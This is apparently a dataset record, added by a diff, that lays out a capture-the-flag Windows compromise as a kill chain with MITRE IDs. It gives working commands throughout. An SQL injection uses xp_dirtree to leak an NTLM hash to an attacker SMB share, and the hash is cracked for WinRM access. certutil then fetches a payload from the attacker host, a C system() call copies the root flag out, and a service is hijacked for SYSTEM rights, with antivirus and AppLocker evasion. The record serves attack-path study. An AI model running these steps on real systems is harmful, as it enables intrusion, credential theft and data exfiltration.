@@ -1,0 +1,136 @@
+{
+  "id": "ap-0018",
+  "title": "Windows Escalation: SQLi NTLM Capture -> Hash Cracking -> WinRM Access -> Service Hijacking LPE",
+  "summary": "Initial user access achieved by exploiting an SQL Injection vulnerability in IIS to capture an NTLMv2 hash, which was then cracked. Privilege escalation used a vulnerable, privileged Windows service that improperly executes an external binary upon restart.",
+  "attack_path_markdown": "### Step 1: Initial Footprint\nInitial recon identified Windows OS and key open ports (80, 443, 3389, 5985).\n### Step 2: Web Exploration and SQLi\nDirectory fuzzing found the `/Reboot` path. SQL error messages revealed a valid username (j.nogueira). Exploiting the SQL server component to force an NTLM hash retrieval.\n### Step 3: Access Gained\nThe captured hash for user 'stacy' was cracked, providing credentials for WinRM access.\n### Step 4: Privilege Escalation\nA service running as NT AUTHORITY\\SYSTEM was found to attempt to execute a non-existent binary (`taskkill.exe`) from a user-writable directory upon restart. A custom C binary was compiled to utilize this flaw, granting full administrative access.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Gathering initial information on the target, identifying operating system, open ports, web applications, and potential injection points.",
+      "actions": [
+        "Check host status: `ping 10.10.10.104`",
+        "OS detection (custom script): `/usr/bin/python3 /usr/bin/check.py 10.10.10.104`",
+        "Port scanning (TCP SYN): `nmap -p- -T5 -Pn -n 10.10.10.104 -oG allports`",
+        "Version and script scanning: `nmap -sC -sV -p80,443,3389,5985 10.10.10.104 -oA architer`",
+        "Web enumeration: `ffuf -c -w /usr/share/wordlists/dirb/common.txt:FUZZ -u http://10.10.10.104/FUZZ -mc all -H 'User-Agent: Mozilla/5.0' -fs 0`",
+        "Identifying Windows through case insensitivity checks (e.g., accessing `/rEEbOoT`)"
+      ],
+      "tools": ["ping", "Nmap", "ffuf", "watweb"],
+      "techniques": ["Active Scanning", "Web Content Discovery", "Error-based SQLi (Passive)"],
+      "mitre_ids": ["T1595", "T1046", "T1083"],
+      "indicators": ["Open ports 80, 443, 3389, 5985", "Microsoft IIS 10.0", "Error message revealing user 'j.nogueira'"],
+      "preconditions": "Network connectivity to the target.",
+      "expected_outcome": "List of open services and confirmed Windows OS.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparation of tools and resources needed for NTLM hash capture and later for privilege escalation.",
+      "actions": [
+        "Setting up SMB listener to capture NTLM hash: `sudo impacket-smbserver smb_folder $(pwd) -smb2support`",
+        "Generating the C source code payload to execute as SYSTEM and exfiltrate the root flag via the established SMB share: `system(\"type C:\\Users\\Administrator\\Desktop\\root.txt > \\\\10.10.14.29\\smb_folder\\root.txt\")` (Note: IP and directory path must be escaped for Windows)",
+        "Compiling the C payload for Windows 64-bit: `x86_64-w64-mingw32-gcc test.c -o taskkill.exe`"
+      ],
+      "tools": ["impacket-smbserver", "mingw-w64"],
+      "techniques": ["NTLM Hash Capture", "Payload Development"],
+      "mitre_ids": ["T1558.003", "T1059.003"],
+      "indicators": ["SMB service listening"],
+      "preconditions": "Writable C source code (test.c) and an active SMB share.",
+      "expected_outcome": "An executable Windows binary named 'taskkill.exe' and an active hash capture listener.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Transmitting the NTLM hash retrieval request to the SQL server.",
+      "actions": [
+        "Injecting SQL command to trigger NTLM authentication to the external SMB share (attacker IP): `...; exec xp_dirtree '\\\\10.10.14.29\\smb_folder\\test'`"
+      ],
+      "tools": ["Web Browser / Injection tool"],
+      "techniques": ["SQL Injection", "NTLM Hash Retrieval"],
+      "mitre_ids": ["T1190"],
+      "indicators": ["Incoming NTLMv2 hash on SMB listener"],
+      "preconditions": "Successful identification of the SQL injection point.",
+      "expected_outcome": "Captured NTLMv2 hash for user 'stacy'.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Cracking the captured hash to gain initial user credentials and using them to access the target.",
+      "actions": [
+        "Cracking the NTLMv2 hash: `john --wordlist=rockyou.txt hash_file`",
+        "Connecting via WinRM using cracked credentials: `evil-winrm -i 10.10.10.104 -u stacy -p [CRACKED_PASSWORD] -s /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt` (Note: Password argument not shown in full command example due to sensitive nature)",
+        "Verifying access and obtaining the initial flag: `type C:\\Users\\stacy\\Desktop\\user.txt`"
+      ],
+      "tools": ["John the Ripper", "evil-winrm"],
+      "techniques": ["Hash Cracking", "Remote Services Access (WinRM)"],
+      "mitre_ids": ["T1110.002", "T1021.006"],
+      "indicators": ["Successful password recovery", "Interactive PowerShell session established", "User flag retrieved."],
+      "preconditions": "Valid NTLMv2 hash capture.",
+      "expected_outcome": "Interactive user session on the target machine.",
+      "confidence": 0.99
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Identifying the privilege escalation vulnerability (service misconfiguration) and deploying the custom binary while attempting to bypass endpoint security.",
+      "actions": [
+        "Enumerating Windows services to find target: `reg query HKLM\\SYSTEM\\CurrentControlSet\\Services` (Filtering for 'unifiVideoService')",
+        "Identifying service vulnerability (Unquoted Service Path / Weak ACLs on writable directory: C:\\ProgramData\\UnifiedVideo)",
+        "Transferring the malicious binary (taskkill.exe) to the machine (after initial AV failure): `certutil.exe -urlcache -f http://10.10.14.29/taskkill.exe taskkill.exe`",
+        "Deploying the binary to a known AppLocker bypass path (optional step if needed for execution): `copy taskkill.exe C:\\Windows\\Tasks\\taskkill.exe`"
+      ],
+      "tools": ["reg query", "certutil.exe", "Custom Binary"],
+      "techniques": ["Service Execution Hijack", "Antivirus Evasion (via custom compilation or tool like Ebola)", "AppLocker Bypass"],
+      "mitre_ids": ["T1574.011", "T1059.003", "T1546"],
+      "indicators": ["Existence of 'unifiVideoService'", "Presence of 'taskkill.exe' in the writable service directory."],
+      "preconditions": "User-level access and knowledge of the vulnerable service path.",
+      "expected_outcome": "Malicious payload is staged and ready for execution by the SYSTEM service.",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Triggering the execution of the malicious binary via service control commands.",
+      "actions": [
+        "Starting attacker listener: `nc -lvnp 443` (If using a reverse shell payload)",
+        "Stopping the service to initiate the exploit chain: `sc stop unifiVideoService`",
+        "Starting the service to execute the binary as NT AUTHORITY\\SYSTEM: `sc start unifiVideoService`"
+      ],
+      "tools": ["netcat", "sc (Service Control utility)"],
+      "techniques": ["Remote Service Management", "Reverse Shell (if used for interactive access)"],
+      "mitre_ids": ["T1053.005", "T1071.001"],
+      "indicators": ["NT AUTHORITY\\SYSTEM process attempting to connect back (or writing data to SMB share)."],
+      "preconditions": "Payload successfully deployed in the service path.",
+      "expected_outcome": "Execution of the payload with high privileges.",
+      "confidence": 0.99
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Achieving the final goal of system compromise and flag retrieval.",
+      "actions": [
+        "The compiled payload executes, reads the Administrator's root flag, and exfiltrates it to the attacker's SMB share."
+      ],
+      "tools": ["Custom C Binary (taskkill.exe)"],
+      "techniques": ["Data Exfiltration"],
+      "mitre_ids": ["T1041"],
+      "indicators": ["Root flag file (root.txt) appears on the attacker's SMB share."],
+      "preconditions": "Successful SYSTEM privilege execution of the custom binary.",
+      "expected_outcome": "Complete compromise of the machine and retrieval of the root flag.",
+      "confidence": 0.99
+    }
+  ],
+  "tactics": ["Initial Access", "Credential Access", "Privilege Escalation", "Execution", "Exfiltration"],
+  "techniques": ["SQL Injection", "Hash Cracking (NTLMv2)", "WinRM Abuse", "Service Binary Hijacking"],
+  "mitre_ids": ["T1190", "T1110.002", "T1574.011", "T1021.006"],
+  "hosts": ["10.10.10.104"],
+  "privs_obtained": ["domain user (stacy)", "NT AUTHORITY\\SYSTEM"],
+  "confidence": 0.9,
+  "source_file": "",
+  "notes": "Procedure included testing two AV evasion methods (custom C and Ebola/Go payload) to bypass Windows Defender and AppLocker for SYSTEM execution.",
+  "labels": ["windows", "privesc", "sqli", "ntlm"]
+}
